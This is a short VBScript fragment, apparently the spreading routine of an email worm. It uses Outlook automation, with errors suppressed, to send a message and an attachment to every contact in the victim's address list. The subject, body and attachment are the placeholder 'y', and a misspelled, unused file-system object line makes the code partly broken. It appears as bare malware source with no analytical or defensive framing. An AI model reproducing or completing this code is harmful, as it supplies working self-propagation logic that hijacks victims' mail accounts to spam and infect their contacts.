dim x 
on error resume next 
set fso="scripting.filesystem.object" 
set so=createobject(fso) 
set ol=createobject("outlook.application") 
set out=wscript.createobject("outlook.application") 
set mapi=out.Getnamespace("mapi") 
set a=mapi.addresslists(1) 
set ae=a.addressentries 
for x=1 to ae.count 
set mail=ol.createitem(0) 
mail.to=ol.Getnamespace("mapi").addresslists(1).addressentries(x) 
mail.subject="y"
mail.Body="y"
mail.attachments.add("y") 
mail.send 
next 
ol.Quit 
